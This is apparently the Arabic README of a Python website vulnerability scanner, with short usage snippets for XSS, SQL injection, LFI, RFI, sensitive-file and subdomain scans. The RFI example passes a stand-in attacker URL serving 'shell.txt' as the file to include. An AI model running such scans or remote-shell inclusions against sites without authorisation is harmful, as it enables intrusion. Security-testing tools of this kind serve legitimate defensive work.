
# 🔒 vuln_scanner

مكتبة **Python** احترافية لفحص واكتشاف أبرز الثغرات الأمنية في المواقع الإلكترونية.  
تساعدك الأداة في تأمين مواقع الويب من خلال اكتشاف مجموعة من الثغرات الشائعة والخطيرة.

---

## 🚀 **المميزات**

- ✅ **XSS (Cross-Site Scripting):** فحص وإيجاد ثغرات إدخال السكريبت.  
- ✅ **SQL Injection (SQLi):** فحص استغلال قواعد البيانات عبر استعلامات SQL.  
- ✅ **Local File Inclusion (LFI):** فحص إدراج الملفات المحلية.  
- ✅ **Remote File Inclusion (RFI):** فحص إدراج الملفات عن بُعد.  
- ✅ **Sensitive Files & Directories Scanner:** اكتشاف الملفات والمجلدات الحساسة.  
- ✅ **Subdomain Scanner:** فحص واكتشاف النطاقات الفرعية للمواقع.  

---

## 📝 **الاستخدام**

### 🔍 **1. فحص ثغرات XSS**

```python
from vuln_scanner import scan_xss

url = "http://example.com/search?q=test"
scan_xss(url)
```

---

### 🔍 **2. فحص ثغرات SQL Injection**

```python
from vuln_scanner import scan_sql_injection

url = "http://example.com/product?id=1"
scan_sql_injection(url)
```

---

### 🔍 **3. فحص ثغرات LFI**

```python
from vuln_scanner import scan_lfi

url = "http://example.com/page.php?file=home"
scan_lfi(url)
```

---

### 🔍 **4. فحص ثغرات RFI**

```python
from vuln_scanner import scan_rfi

url = "http://example.com/page.php?file="
external_url = "http://malicious.com/shell.txt"
scan_rfi(url, external_url)
```

---

### 🔍 **5. فحص الملفات والدلائل الحساسة**

```python
from vuln_scanner import hidden_link_finder

url = "http://example.com"
wordlist = "common.txt"

hidden_link_finder(url, wordlist)
```

---

### 🔍 **6. فحص النطاقات الفرعية (Subdomain Scanner)**

```python
from vuln_scanner import subdomain_scanner

domain = "example.com"
wordlist = "subdomains.txt"

subdomain_scanner(domain, wordlist)
```



💡 **إذا كان لديك أي استفسارات أو اقتراحات، لا تتردد في التواصل!**
